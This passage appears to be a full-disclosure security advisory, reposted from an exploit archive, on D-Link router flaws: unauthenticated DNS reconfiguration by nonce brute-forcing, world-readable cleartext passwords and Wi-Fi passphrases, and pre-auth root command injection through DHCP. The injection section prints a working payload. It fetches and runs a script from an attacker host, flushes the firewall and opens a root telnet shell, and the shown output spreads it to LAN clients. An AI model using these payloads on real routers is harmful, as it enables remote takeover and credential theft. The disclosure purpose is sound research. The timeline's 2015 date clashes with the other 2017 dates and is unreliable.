+                B5:BF:D1:A5:D6:6F:20:B0:89:1F:A6:C1:58:05:31:B2:B3:D0:C1:01
+            X509v3 Authority Key Identifier:
+
+keyid:5D:F8:E9:B5:F1:57:A4:90:94:BB:9F:DB:F7:91:95:E7:1C:A2:E7:D2
+
+    Signature Algorithm: sha1WithRSAEncryption
+        3d:09:22:d0:a6:7d:9c:cd:bd:5b:ad:62:c2:6a:29:12:d1:61:
+        88:ca:1e:68:1d:04:dd:40:fb:a9:d3:9f:22:49:dc:fa:fb:3c:
+        21:dd:45:a5:53:1a:9b:80:ee:50:16:a6:36:3a:3c:f0:39:27:
+        e4:8d:70:20:03:73:7f:26:65:ac:ab:05:b1:84:ee:7c:16:43:
+        ca:2f:b5:6b:44:fc:75:a1:c7:86:04:18:b4:df:b2:76:f3:88:
+        fb:dc:ec:99:3d:fe:d1:7c:ea:fa:56:eb:0b:d5:69:84:48:3d:
+        12:db:d1:ef:f9:89:b0:62:70:ec:be:dd:e6:ef:dd:88:cf:f4:
+        e5:ff:1d:88:d5:e0:23:f0:bb:a3:df:8e:8a:05:ea:f3:dc:14:
+        49:2d:46:4a:27:40:a6:fc:70:4a:f5:94:3f:94:64:d1:93:7b:
+        03:12:75:67:30:ee:8c:07:e1:73:77:00:23:d6:68:20:07:7f:
+        8f:4e:1d:e8:76:87:0d:4c:26:f6:56:84:e2:56:98:a0:6c:ad:
+        71:21:23:a4:a6:3b:b9:8e:27:13:c2:ae:70:0f:6a:c6:be:b8:
+        88:9a:0a:d7:00:39:3a:90:7e:5f:4d:22:88:4e:a6:8a:2f:42:
+        b4:dc:18:a4:eb:fa:f1:04:0e:a7:e2:ff:5d:ac:cd:61:28:01:
+        7e:d3:01:13
+    -----BEGIN CERTIFICATE-----
+    MIIEBDCCAuygAwIBAgIJAIdviHaH3+d4MA0GCSqGSIb3DQEBBQUAMHoxCzAJBgNV
+    BAYTAlRXMQ8wDQYDVQQIDAZUYWl3YW4xDTALBgNVBAoMBE5vbmUxDTALBgNVBAsM
+    BE5vbmUxGDAWBgNVBAMMD0dlbmVyYWwgUm9vdCBDQTEiMCAGCSqGSIb3DQEJARYT
+    d2VibWFzdGVyQGxvY2FsaG9zdDAeFw0xMjAyMjIwNjA0MzZaFw0zMjAyMTcwNjA0
+    MzZaMIGLMQswCQYDVQQGEwJUVzEPMA0GA1UECAwGVGFpd2FuMRAwDgYDVQQHDAdI
+    c2luQ2h1MQ0wCwYDVQQKDAROb25lMQ0wCwYDVQQLDAROb25lMRcwFQYDVQQDDA5H
+    ZW5lcmFsIFJvdXRlcjEiMCAGCSqGSIb3DQEJARYTd2VibWFzdGVyQGxvY2FsaG9z
+    dDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKP9G2XKXNzaXPPWIjXD
+    /pD8YSwhi5mF0eKxy7diNQW55F1h5DGNVJn6vRQMwWErz2BBhEeIGKuOu8r6ecDv
+    ewlKE0iR2yQz56fURI+sC3DJBu0fToPP1rkN4bKHsT7uGJIyVz4bUOmJFe7HhA4D
+    9wtkzagpx3V86krO/r09e3IcLvMGro/1TFWdhUR1OtyUPQxuj6nLnR01vk/ylZ5l
+    l0J7KYK/GTIV6GxE7XarUT7cWwPJhGXhfPnCKAPVXKj9Pf1TAW0ZvqOfkOIY7b0q
+    7/ltmxHfgQ1PleOWV/GXz6BFmI0KiJL+2jBAkyF9nm4CrIwitz32FF+T2G1VlFft
+    e+sCAwEAAaN7MHkwCQYDVR0TBAIwADAsBglghkgBhvhCAQ0EHxYdT3BlblNTTCBH
+    ZW5lcmF0ZWQgQ2VydGlmaWNhdGUwHQYDVR0OBBYEFLW/0aXWbyCwiR+mwVgFMbKz
+    0MEBMB8GA1UdIwQYMBaAFF346bXxV6SQlLuf2/eRleccoufSMA0GCSqGSIb3DQEB
+    BQUAA4IBAQA9CSLQpn2czb1brWLCaikS0WGIyh5oHQTdQPup058iSdz6+zwh3UWl
+    UxqbgO5QFqY2OjzwOSfkjXAgA3N/JmWsqwWxhO58FkPKL7VrRPx1oceGBBi037J2
+    84j73OyZPf7RfOr6VusL1WmESD0S29Hv+YmwYnDsvt3m792Iz/Tl/x2I1eAj8Luj
+    346KBerz3BRJLUZKJ0Cm/HBK9ZQ/lGTRk3sDEnVnMO6MB+FzdwAj1mggB3+PTh3o
+    docNTCb2VoTiVpigbK1xISOkpju5jicTwq5wD2rGvriImgrXADk6kH5fTSKITqaK
+    L0K03Bik6/rxBA6n4v9drM1hKAF+0wET
+    -----END CERTIFICATE-----
+
+
+
+## Details - WAN && LAN - revA - Nonce bruteforcing for DNS configuration
+
+The file `htdocs/parentalcontrols/bind.php` allows to change DNS configuration.
+It doesn't check authentication of the admin user.
+
+An attacker can bruteforce the nonce (`?nonce=integer`). There are no
+limitations of HTTP requests and no authentication method:
+
+
+      8 $uptime_limit =
+query(INF_getinfpath($WAN1)."/open_dns/nonce_uptime") + 1800;
+      9 if(query(INF_getinfpath($WAN1)."/open_dns/nonce")!=$_GET["nonce"]
+|| $_GET["nonce"]=="")
+     10 {
+     11         $Response="BindError";
+     12 }
+     13 else if(query("/runtime/device/uptime") > $uptime_limit)
+     14 {
+     15         $Response="BindTimeout";
+     16 }
+
+
+The attacker can then define new DNS servers:
+
+     21         set(INF_getinfpath($WAN1)."/open_dns/deviceid",
+$_GET["deviceid"]);
+     22
+set(INF_getinfpath($WAN1)."/open_dns/parent_dns_srv/dns1",
+$_GET["dnsip1"]);
+     23
+set(INF_getinfpath($WAN1)."/open_dns/parent_dns_srv/dns2",
+$_GET["dnsip2"]);
+
+
+An attacker can use this vuln to forward traffic to server he/she
+controls (i.e.: custom Dlink Cloud servers, to take control over the
+dlink router).
+
+
+
+## Details - Local - revA and revB - Weak files permission and
+credentials stored in cleartext
+
+It appears some files have weak permissions:
+
+1. /var/passwd
+
+/var/passwd contains credentials in cleartext.
+
+The permissions of /var/passwd are: -rw-rw-rw- (666)
+
+    # ls -la /var/passwd
+    -rw-rw-rw-    1 root     root           28 Jan  1 00:00 /var/passwd
+    # cat /var/passwd
+    "Admin" "password" "0"
+
+
+2. /var/etc/hnapasswd
+
+Note that an attacker can use /var/etc/hnapasswd to retrieve the
+password in cleartext too:
+
+    # cat /var/etc/hnapasswd
+    Admin:password
+
+The permissions of /var/etc/hnapasswd are: -rw-rw-rw- (666)
+
+    # ls -la /var/etc/hnapasswd
+    -rw-rw-rw-    1 root     root           20 Jan  1 00:00 /var/etc/hnapasswd
+
+
+3. /etc/shadow
+
+/etc/shadow is a symlink to /var/etc/passwd. The file /var/etc/passwd
+is world-readable, as shown below:
+
+    # ls -al /etc/shadow
+    lrwxrwxrwx    1 root     root           15 Jan 20  2017
+/etc/shadow -> /var/etc/shadow
+    # ls -la /var/etc/shadow
+    -rw-r--r--    1 root     root           93 Jan  1 00:00 /var/etc/shadow
+
+
+This file contains a DES hash of the admin user.
+
+    # cat /var/etc/shadow
+    root:!:10956:0:99999:7:::
+    nobody:!:10956:0:99999:7:::
+    Admin:zVc1PPVw2VWMc:10956:0:99999:7:::
+
+
+4. /var/run/storage_account_root
+
+/var/run/storage_account_root contains credentials in cleartext.
+
+The permissions of /var/passwd are: -rw-rw-rw- (666)
+
+    # ls -la /var/run/storage_account_root
+    -rw-rw-rw-    1 root     root           40 Jan  1 00:00
+/var/run/storage_account_root
+    # cat /var/run/storage_account_root
+    admin:password,:::
+    jean-claude:dusse,:::
+
+
+5. /var/run/hostapd*
+
+The files /var/run/hostapd* contain the wireless passphrase in cleartext.
+
+The permissions of these files are: -rw-rw-rw- (666)
+
+    # ls -la /var/run/hostapd*
+    -rw-rw-rw-    1 root     root           73 Jan  1 00:00
+/var/run/hostapd-wlan1wps.eap_user
+    -rw-rw-rw-    1 root     root         1160 Jan  1 00:00
+/var/run/hostapd-wlan1.conf
+    -rw-rw-rw-    1 root     root           73 Jan  1 00:00
+/var/run/hostapd-wlan0wps.eap_user
+    -rw-rw-rw-    1 root     root         1170 Jan  1 00:00
+/var/run/hostapd-wlan0.conf
+    # cat /var/run/hostapd*|grep -i pass
+    wpa_passphrase=aaaaa00000
+    wpa_passphrase=aaaaa00000
+
+
+
+## Details - WAN - revB - Pre-Auth RCEs as root (L2)
+
+The DHCP client running on the router is vulnerable to several command
+injections as root.
+
+Please use the dhcpd.conf file provided:
+
+    rasp-pwn-dlink# cat /etc/dhcp/dhcpd.conf
+    option domain-name ";wget -O /var/re http://10.254.239.1/dhcp-rce
+; sh /var/re;";
+    option domain-name-servers 8.8.8.8, 8.8.4.4;
+    default-lease-time 600;
+    max-lease-time 7200;
+    ddns-update-style none;
+    subnet 10.254.239.0 netmask 255.255.255.224 {
+      range 10.254.239.10 10.254.239.20;
+      option routers 10.254.239.1;
+    }
+    rasp-pwn-dlink# ifconfig eth1
+    eth1      Link encap:Ethernet  HWaddr 00:0e:c6:aa:aa:aa
+              inet addr:10.254.239.1  Bcast:10.254.239.255  Mask:255.255.255.0
+              inet6 addr: fe80::20e:caaa:aaaa:aaa/64 Scope:Link
+              UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+              RX packets:129 errors:0 dropped:0 overruns:0 frame:0
+              TX packets:107 errors:0 dropped:0 overruns:0 carrier:0
+              collisions:0 txqueuelen:1000
+              RX bytes:11181 (10.9 KiB)  TX bytes:49155 (48.0 KiB)
+
+    rasp-pwn-dlink# cat /var/www/html/dhcp-rce
+    #!/bin/sh
+
+    wget -O /var/telnetd-dhcpd-wan http://10.254.239.1/dlink-telnetd
+    chmod 777 /var/telnetd-dhcpd-wan
+    (for i in 0 1 2 3; do # win races against legit iptables rules
+    iptables -F
+    iptables -X
+    iptables -t nat -F
+    iptables -t nat -X
+    iptables -P INPUT ACCEPT
+    iptables -P OUTPUT ACCEPT
+    iptables -P FORWARD ACCEPT
+    sleep 10
+    done ) &
+
+    /var/telnetd-dhcpd-wan -l /bin/sh -p 110 &
+
+    rasp-pwn-dlink# dhcpd eth1
+    Internet Systems Consortium DHCP Server 4.3.1
+    Copyright 2004-2014 Internet Systems Consortium.
+    All rights reserved.
+    For info, please visit https://www.isc.org/software/dhcp/
+    Config file: /etc/dhcp/dhcpd.conf
+    Database file: /var/lib/dhcp/dhcpd.leases
+    PID file: /var/run/dhcpd.pid
+    Wrote 1 leases to leases file.
+    Listening on LPF/eth1/00:0e:c6:aa:aa:aa/10.254.239.0/27
+    Sending on   LPF/eth1/00:0e:c6:aa:aa:aa/10.254.239.0/27
+    Sending on   Socket/fallback/fallback-net
+    rasp-pwn-dlink#
+
+
+When doing a DHCP request at startup, the router connects from the WAN
+the remote HTTP server:
+
+    rasp-pwn-dlink# tail -f /var/log/nginx/access.log
+    10.254.239.10 - - [03/Jul/2017:15:40:30 +0000] "GET /dhcp-rce
+HTTP/1.1" 200 383 "-" "Wget"
+    10.254.239.10 - - [03/Jul/2017:15:40:30 +0000] "GET /dlink-telnetd
+HTTP/1.1" 200 10520 "-" "Wget"
+    10.254.239.10 - - [03/Jul/2017:15:40:30 +0000] "GET /dhcp-rce
+HTTP/1.1" 200 383 "-" "Wget"
+    10.254.239.10 - - [03/Jul/2017:15:40:30 +0000] "GET /dlink-telnetd
+HTTP/1.1" 200 10520 "-" "Wget"
+
+
+And now we got a telnetd from the WAN:
+
+    rasp-pwn-dlink# telnet 10.254.239.10 110
+    Trying 10.254.239.10...
+    Connected to 10.254.239.10.
+    Escape character is '^]'.
+
+
+    BusyBox v1.14.1 (2017-01-20 14:35:27 CST) built-in shell (msh)
+    Enter 'help' for a list of built-in commands.
+
+    # uname -ap
+    Linux dlinkrouter 2.6.30.9 #1 Fri Jan 20 14:12:50 CST 2017 rlx GNU/Linux
+    # cd /var
+    # ls -la
+    drwxr-xr-x    5 root     root            0 Jan  1 00:00 etc
+    drwxr-xr-x    2 root     root            0 Jan  1  1970 log
+    drwxr-xr-x    3 root     root            0 Jan  1 00:00 run
+    drwxr-xr-x    2 root     root            0 Jan  1  1970 sealpac
+    drwxr-xr-x    4 root     root            0 Jan  1 00:00 tmp
+    drwxr-xr-x    2 root     root            0 Jan  1  1970 dnrd
+    drwxr-xr-x    4 root     root            0 Jan  1  1970 htdocs
+    -rw-r--r--    1 root     root           10 Jan  1  1970 TZ
+    drwxr-xr-x    2 root     root            0 Jan  1 00:00 servd
+    -rw-r--r--    1 root     root         5588 Jan  1  1970 default_wifi.xml
+    -rw-rw-rw-    1 root     root           28 Jan  1 00:00 passwd
+    drwxrwx---    2 root     root            0 Jan  1 00:00 session
+    srwxr-xr-x    1 root     root            0 Jan  1 00:00 gpio_ctrl
+    -rw-r--r--    1 root     root            2 Jan  1 00:00 sys_op
+    drwxr-xr-x    2 root     root            0 Jan  1 00:00 home
+    lrwxrwxrwx    1 root     root           16 Jan  1 00:00
+portal_share -> /var/tmp/storage
+    drwxr-xr-x    3 root     root            0 Jan  1 00:00 proc
+    -rwxr-xr-x    1 root     root          856 Jan  1 00:00 killrc0
+    drwxr-xr-x    2 root     root            0 Jan  1 00:00 porttrigger
+    -rw-r--r--    1 root     root          383 Jan  1 00:00 re
+    -rwxrwxrwx    1 root     root        10520 Jan  1 00:00 telnetd-dhcpd-wan
+    -rw-rw-rw-    1 root     root          301 Jan  1 00:00 rendezvous.conf
+    -rw-rw-rw-    1 root     root          523 Jan  1 00:00 stunnel.conf
+    -rw-rw-rw-    1 root     root          282 Jan  1 00:00 topology.conf
+    -rw-rw-rw-    1 root     root          394 Jan  1 00:00 lld2d.conf
+    -rw-r--r--    1 root     root          199 Jan  1 00:00 hosts
+    drwxr-xr-x   16 root     root          241 Jan 20  2017 ..
+    drwxr-xr-x   14 root     root            0 Jan  1 00:00 .
+    # cat re
+    #!/bin/sh
+
+    wget -O /var/telnetd-dhcpd-wan http://10.254.239.1/dlink-telnetd
+    chmod 777 /var/telnetd-dhcpd-wan
+    (for i in 0 1 2 3; do # win races against legit iptables rules
+    iptables -F
+    iptables -X
+    iptables -t nat -F
+    iptables -t nat -X
+    iptables -P INPUT ACCEPT
+    iptables -P OUTPUT ACCEPT
+    iptables -P FORWARD ACCEPT
+    sleep 10
+    done ) &
+    /var/telnetd-dhcpd-wan -l /bin/sh -p 110 &
+
+    #
+
+This telnetd access is reachable from the WAN and the LAN.
+
+
+
+Analysis of the vulnerabilities
+
+
+There are several WAN RCEs. The first problem is located here:
+
+/etc/services/INET/inet_ipv4.php
+
+     94         $udhcpc_helper  = "/var/servd/".$inf."-udhcpc.sh";
+
+And you have command injections everywhere starting line 101.
+
+
+     99     fwrite(w,$udhcpc_helper,
+    100                 '#!/bin/sh\n'.
+    101                 'echo [$0]: $1 $interface $ip $subnet $router
+$lease $domain $scope $winstype $wins $sixrd_prefix $sixrd_prefixlen
+$sixrd_msklen $sixrd_bripaddr ... > /dev/console\n'.
+    102                 'phpsh '.$hlper.' ACTION=$1'.
+    103                         ' INF='.$inf.
+    104                         ' INET='.$inet.
+    105                         ' MTU='.$mtu.
+    106                         ' INTERFACE=$interface'.
+    107                         ' IP=$ip'.
+    108                         ' SUBNET=$subnet'.
+    109                         ' BROADCAST=$broadcast'.
+    110                         ' LEASE=$lease'.
+    111                         ' "DOMAIN=$domain"'.
+    112                         ' "ROUTER=$router"'.
+    113                         ' "DNS='.$dns.'$dns"'.
+    114                         ' "CLSSTROUT=$clsstrout"'.
+    115                         ' "MSCLSSTROUT=$msclsstrout"'.
+    116                         ' "SSTROUT=$sstrout"'.
+    117                         ' "SCOPE=$scope"'.
+    118                         ' "WINSTYPE=$winstype"'.
+    119                         ' "WINS=$wins"'.
+    120                         ' "SIXRDPFX=$sixrd_prefix"'.
+    121                         ' "SIXRDPLEN=$sixrd_prefixlen"'.
+    122                         ' "SIXRDMSKLEN=$sixrd_msklen"'.
+    123                         ' "SIXRDBRIP=$sixrd_bripaddr"'.
+    124                         ' "SDEST=$sdest"'.
+    125                         ' "SSUBNET=$ssubnet"'.
+    126                         ' "SROUTER=$srouter"\n'.
+    127                 'exit 0\n'
+    128                 );
+
+
+As you can see, variables are not sanitized. One solution is also to
+inject commands using the `/var/servd/$VAR-udhcpc.sh` script with
+`$domain` (`option domain-name` in isc-dhcp).
+
+The `WAN-1-udhcpc.sh` file will be generated and called by `udhcpc`
+(`udhcpc -i eth1 -H dlinkrouter -p /var/servd/WAN-1-udhcpc.pid -s
+/var/servd/WAN-1-udhcpc.sh`)
+
+    # cat WAN-1-udhcpc.sh
+    #!/bin/sh
+    echo [$0]: $1 $interface $ip $subnet $router $lease $domain $scope
+$winstype $wins $sixrd_prefix $sixrd_prefixlen $sixrd_msklen
+$sixrd_bripaddr ... > /dev/console
+    phpsh /etc/services/INET/inet4_dhcpc_helper.php ACTION=$1
+INF=WAN-1 INET=INET-3 MTU=1500 INTERFACE=$interface IP=$ip
+SUBNET=$subnet BROADCAST=$broadcast LEASE=$lease "DOMAIN=$domain"
+"ROUTER=$router" "DNS=$dns" "CLSSTROUT=$clsstrout"
+"MSCLSSTROUT=$msclsstrout" "SSTROUT=$sstrout" "SCOPE=$scope"
+"WINSTYPE=$winstype" "WINS=$wins" "SIXRDPFX=$sixrd_prefix"
+"SIXRDPLEN=$sixrd_prefixlen" "SIXRDMSKLEN=$sixrd_msklen"
+"SIXRDBRIP=$sixrd_bripaddr" "SDEST=$sdest" "SSUBNET=$ssubnet"
+"SROUTER=$srouter"
+    exit 0
+
+
+So using this DNS configuration will work against the router:
+
+    option domain-name "`wget -O /var/re http://10.254.239.1/dhcp-rce
+; sh /var/re;`";
+
+In the logs, we confirm the execution:
+
+    rasp-pwn-dlink# tail -f /var/log/nginx/access.log
+    10.254.239.10 - - [03/Jul/2017:15:42:31 +0000] "GET /dhcp-rce
+HTTP/1.1" 200 383 "-" "Wget"
+    10.254.239.10 - - [03/Jul/2017:15:42:31 +0000] "GET /dlink-telnetd
+HTTP/1.1" 200 10520 "-" "Wget"
+
+
+
+Note that you also have command injections inside some generated files
+(in `/var/servd/`) using the `;wget -O /var/re
+http://10.254.239.1/dhcp-rce ; sh /var/re;` payload:
+
+
+    # cat /var/servd/DHCPS4.LAN-1_start.sh
+    #!/bin/sh
+    rm -f /var/servd/LAN-1-udhcpd.lease
+    xmldbc -X /runtime/inf:1/dhcps4/leases
+    xmldbc -s /runtime/inf:1/dhcps4/pool/start 192.168.0.100
+    xmldbc -s /runtime/inf:1/dhcps4/pool/end 192.168.0.199
+    xmldbc -s /runtime/inf:1/dhcps4/pool/leasetime 604800
+    xmldbc -s /runtime/inf:1/dhcps4/pool/network 192.168.0.1
+    xmldbc -s /runtime/inf:1/dhcps4/pool/mask 24
+    xmldbc -s /runtime/inf:1/dhcps4/pool/domain ;wget -O /var/re
+http://10.254.239.1/dhcp-rce ; sh /var/re; <--- command injection
+    xmldbc -s /runtime/inf:1/dhcps4/pool/router 192.168.0.1
+    event UPDATELEASES.LAN-1 add "@/etc/events/UPDATELEASES.sh LAN-1
+/var/servd/LAN-1-udhcpd.lease"
+    udhcpd /var/servd/LAN-1-udhcpd.conf &
+    exit 0
+    exit 0
+    #
+
+    # cat /var/servd/DHCPS4.LAN-2_start.sh
+    #!/bin/sh
+    rm -f /var/servd/LAN-2-udhcpd.lease
+    xmldbc -X /runtime/inf:2/dhcps4/leases
+    xmldbc -s /runtime/inf:2/dhcps4/pool/start 192.168.7.100
+    xmldbc -s /runtime/inf:2/dhcps4/pool/end 192.168.7.199
+    xmldbc -s /runtime/inf:2/dhcps4/pool/leasetime 604800
+    xmldbc -s /runtime/inf:2/dhcps4/pool/network 192.168.7.1
+    xmldbc -s /runtime/inf:2/dhcps4/pool/mask 24
+    xmldbc -s /runtime/inf:2/dhcps4/pool/domain ;wget -O /var/re
+http://10.254.239.1/dhcp-rce ; sh /var/re; <--- command injection
+    xmldbc -s /runtime/inf:2/dhcps4/pool/router 192.168.7.1
+    event UPDATELEASES.LAN-2 add "@/etc/events/UPDATELEASES.sh LAN-2
+/var/servd/LAN-2-udhcpd.lease"
+    udhcpd /var/servd/LAN-2-udhcpd.conf &
+    exit 0
+    exit 0
+    #
+
+
+
+Bonus point: this attack will be relayed to internal clients using the
+dhcp server running inside the router.
+So if you connect a vulnerable Dlink router to the internal network,
+it will be pwned too:
+
+    # ps -w|grep dhcpd
+     6543 root       984 S    udhcpd /var/servd/LAN-1-udhcpd.conf
+     6595 root       984 S    udhcpd /var/servd/LAN-2-udhcpd.conf
+
+
+The `/runtime/inf:{1,2}/dhcps4/pool/domain` entries in the
+`/var/servd/LAN-{1,2}-udhcpd.conf` files contain the rogue domain
+value:
+
+    # cat /var/servd/LAN-1-udhcpd.conf
+    remaining no
+    start 192.168.0.100
+    end 192.168.0.199
+    interface br0
+    lease_file /var/servd/LAN-1-udhcpd.lease
+    pidfile /var/servd/LAN-1-udhcpd.pid
+    force_bcast no
+    opt subnet 255.255.255.0
+    opt domain ;wget -O /var/re http://10.254.239.1/dhcp-rce ; sh
+/var/re; <--------  this domain will be provided to clients connected
+on the LAN, possibly infecting other dlink routers \o/
+    opt router 192.168.0.1
+    opt dns 192.168.0.1
+    opt lease 604800
+    dhcp_helper event UPDATELEASES.LAN-1
+    # cat /var/servd/LAN-2-udhcpd.conf
+    remaining no
+    start 192.168.7.100
+    end 192.168.7.199
+    interface br1
+    lease_file /var/servd/LAN-2-udhcpd.lease
+    pidfile /var/servd/LAN-2-udhcpd.pid
+    force_bcast no
+    opt subnet 255.255.255.0
+    opt domain ;wget -O /var/re http://10.254.239.1/dhcp-rce ; sh
+/var/re <--------  this domain will be provided to clients connected
+on the LAN, possibly infecting other dlink routers \o/
+    opt router 192.168.7.1
+    opt dns 192.168.7.1
+    opt lease 604800
+    dhcp_helper event UPDATELEASES.LAN-2
+    #
+
+
+
+## Details - LAN - revA and revB - DoS against some daemons
+
+It appears some daemons running in the routers (revA and revB) can be
+crashed remotely from the LAN.
+As it doesn't provide further remote privileges to an attacker, this
+is only for information and was not detailed.
+
+
+
+## Vendor Response
+
+Due to difficulties in previous exchange with Dlink[1],
+Full-disclosure is applied.
+Their previous lack of consideration about security made me publish
+this research without coordinated disclosure.
+
+I advise to IMMEDIATELY DISCONNECT vulnerable routers from the Internet.
+
+
+[1]: http://pierrekim.github.io/blog/2017-02-02-update-dlink-dwr-932b-lte-routers-vulnerabilities.html
+
+
+
+## Report Timeline
+
+* Jun 15, 2017: Vulnerabilities found.
+* Jul 03, 2015: This advisory is written.
+* Sep 08, 2017: A public advisory is sent to security mailing lists.
+
+#  0day.today [2023-03-25]  #
